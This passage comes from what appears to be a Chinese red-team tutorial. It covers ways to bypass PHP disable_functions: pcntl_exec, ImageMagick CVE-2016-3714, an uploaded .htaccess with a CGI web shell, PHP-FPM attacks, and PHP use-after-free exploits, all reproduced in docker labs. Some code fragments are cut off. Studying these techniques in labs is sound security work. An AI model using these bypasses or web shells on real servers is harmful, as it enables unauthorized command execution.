    echo file_get_contents("/tmp/cmd_result"); 
    ?>
## 利用Pcntl组件
如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。
[exp](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/pcntl_exec/exp.php)为:
    #pcntl_exec().php
    #/tmp/b4dboy.sh
    #!/bin/bash
    ls -l /
## 利用ImageMagick 漏洞绕过(CVE-2016–3714)
利用条件:
  * 目标主机安装了漏洞版本的imagemagick（= 5.4
### ImageMagick介绍
ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、
PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。
产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。
据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。  
[EXP](https://www.exploit-db.com/exploits/39766)如下:
    readImage('KKKK.mvg');
    $thumb->writeImage('KKKK.png');
    $thumb->clear();
    $thumb->destroy();
    unlink("KKKK.mvg");
    unlink("KKKK.png");
    ?>
漏洞原理参考p牛文章:
### 漏洞复现
获取和运行镜像
    docker pull medicean/vulapps:i_imagemagick_1
    docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
访问`phpinfo.php`,发现开启了imagemagick服务
进入容器:`docker run -t -i medicean/vulapps:i_imagemagick_1 "/bin/bash"`
查看`poc.php`,这其实是已经写好的poc,执行命令就是`ls -la`
验证poc,在容器外执行`docker exec i_imagemagick_1 convert /poc.png 1.png`
poc可自行构建
## 利用 Apache Mod CGI
利用条件:
  * Apache + PHP (apache 使用 apache_mod_php)
  * Apache 开启了 cgi, rewrite
  * Web 目录给了 AllowOverride 权限
### 关于mod_cgi是什么
任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。  
当Apache 开启了cgi,
rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。
### 如何利用
由于环境搭建困难,使用蚁剑的[docker](https://github.com/AntSwordProject/AntSword-Labs)
在web目录下上传`.htaccess`文件
    Options +ExecCGI
    AddHandler cgi-script .ant
上传shell.ant
    #!/bin/sh
    echo Content-type: text/html
    echo ""
    echo&&id
由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。
直接访问shell.xxx ,这里报错,是因为权限的问题
直接使用蚁剑修改权限
复现成功
## 利用攻击PHP-FPM
利用条件
  * Linux 操作系统
  * PHP-FPM
  * 存在可写的目录, 需要上传 .so 文件
关于什么是PHP-FPM,这个可以看  
关于如何攻击PHP-FPM,请看这篇[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)
蚁剑环境
    git clone https://github.com/AntSwordProject/AntSword-Labs.git
    cd AntSword-Labs/bypass_disable_functions/5
    docker-compose up -d
连接shell后无法执行命令
查看phpinfo,发现目标主机配置了`FPM/Fastcgi`
使用插件
要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是
127.0.0.1:9000,所以这里改为127.0.0.1：9000
但是这里我死活利用不了
这里换了几个版本还是不行，但看网上师傅利用是没问题的  
有感兴趣想复现师傅看这里:
## 利用 GC UAF
利用条件
  * Linux 操作系统
  * PHP7.0 - all versions to date
  * PHP7.1 - all versions to date
  * PHP7.2 - all versions to date
  * PHP7.3 - all versions to date
[EXP](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)  
[关于原理](http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0\(1st)/)  
通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。
搭建环境
    cd AntSword-Labs/bypass_disable_functions/6
    docker-compose up -d
受到disable_function无法执行命令
使用插件成功执行后弹出一个新的虚拟终端，成功bypass
## 利用 Json Serializer UAF
利用条件
  * Linux 操作系统
  * PHP7.1 - all versions to date
  * PHP7.2 
利用复现:  
获得镜像
    git clone https://github.com/AntSwordProject/AntSword-Labs.git
    cd AntSword-Labs/bypass_disable_functions/9
    docker-compose up -d
无法执行命令
使用iconv插件bypass
创建副本后,将url改为`/.antproxy.php`
## Reference
最后欢迎关注团队公众号：红队蓝军